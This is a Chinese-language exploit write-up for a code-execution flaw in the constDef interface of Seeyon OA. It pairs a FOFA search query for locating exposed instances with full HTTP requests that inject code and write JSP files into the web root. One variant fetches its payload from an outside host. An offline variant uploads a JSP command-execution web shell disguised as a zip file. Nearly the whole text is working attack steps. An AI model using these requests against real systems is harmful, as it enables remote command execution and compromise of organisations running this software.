# 致远OA系统constDef接口存在代码执行漏洞

## fofa

```yaml
app="致远互联-OA"
```

## poc

首先新建一个常量，constKey(常量名)为demo。

```yaml
/seeyon/constDef.do?method=newConstDef&constKey=demo&constDefine=1&constDescription=123&constType=4
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407222340048.png)

可以通过如下接口查看常量是否新建完成。

```java
/seeyon/ajax.do?method=ajaxAction&managerName=constDefManager&rnd=123123123&managerMethod=listPage&arguments=%5B%7B%22page%22%3A1%2C%22size%22%3A20%7D%2C%7B%7D%5D
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407222340957.png)

再新建一个常量，constType值为4表示常量类型为宏替换，在constDefine(常量定义)中引用常量demo，构造闭合造成代码执行。

```yaml
/seeyon/constDef.do?method=newConstDef&constKey=asdasd&constDefine=$demo%20%22;new%20File(%22../webapps/ROOT/1111.jsp%22).write(new%20String(Base64.getDecoder().decode(%22PCVvdXQucHJpbnRsbigiMjEzMjEzIik7JT4=%22)));%22&constDescription=123&constType=4
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407222341930.png)

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407222342108.png)



## 出网利用写webshell

**Step1：**

出网情况直接通过远程下载可以比较有效**Bypass Waf**方法。

```java
POST /seeyon/constDef.do HTTP/1.1
Host: 172.16.135.220:8089
accept: */*
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 545

method=newConstDef&constKey=uddd1&constDefine=new+File('../webapps/ROOT/test.jspx')+<<+new+URL('http%3a//192.168.43.81%3a18080/123.txt').text&constType=2
```

![image-20240723205434737](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407232054812.png)

*** Step2：***

引用`Step1：`定义常量，构造闭合造成代码执行。

```java
POST /seeyon/constDef.do HTTP/1.1
Host: 172.16.135.220:8089
accept: */*
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

method=newConstDef&constKey=runtime1c2345accaccc&constDefine=evaluate+$uddd1&constType=3
```

![image-20240723205550158](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407232055225.png)

**Step3：**

通过`listConstDef`方法触发漏洞

```javascript
POST /seeyon/constDef.do HTTP/1.1
Host: 172.16.135.220:8089
accept: */*
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

method=listConstDef&page=1&rows=100
```

![image-20240723205641905](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407232056968.png)



## 不出网情况

 ***Step1：\***

把文件进行落地。

上传后的路径：**/base/upload/年/月/日/返回的id**

例如：**/base/upload/2024/07/22/2101525989813472287**

```bash
POST /seeyon/fileUpload.do?method=processUpload&maxSize= HTTP/1.1
Host: 172.16.135.236:8089
Cookie: JSESSIONID=0D3102C6F8445B2207B3A29DF9C4BAE6
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------1416682316313
Content-Length: 1172

-----------------------------1416682316313
Content-Disposition: form-data; name="type"


-----------------------------1416682316313
Content-Disposition: form-data; name="extensions"


-----------------------------1416682316313
Content-Disposition: form-data; name="applicationCategory"


-----------------------------1416682316313
Content-Disposition: form-data; name="destDirectory"


-----------------------------1416682316313
Content-Disposition: form-data; name="destFilename"


-----------------------------1416682316313
Content-Disposition: form-data; name="maxSize"


-----------------------------1416682316313
Content-Disposition: form-data; name="isEncrypt"

false
-----------------------------1416682316313
Content-Disposition: form-data; name="file1"; filename="tets.zip"
Content-Type: Image/x-zip-compressed

<% Runtime.getRuntime().exec(request.getParameter("a"));%>
-----------------------------1416682316313--
```

![image-20240723205817934](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407232058005.png)

Step2

通过读取本地文件，进行写入文件可以完美解决写入文件长度的长度

```bash
POST /seeyon/constDef.do HTTP/1.1
Host: 172.16.135.220:8089
accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 545

method=newConstDef&constKey=u6da&constDefine=new+File('../webapps/ROOT/gsl.jsp')+<<+new+File('../../base/upload/2024/06/06/2101525989813472287').text&constType=2
```

后续两个步骤触发漏洞跟之前的**Step2**、**Step3**一样。

## 漏洞来源

- https://blog.csdn.net/LiangYueSec/article/details/140608564
- https://www.t00ls.com/thread-72119-1-1.html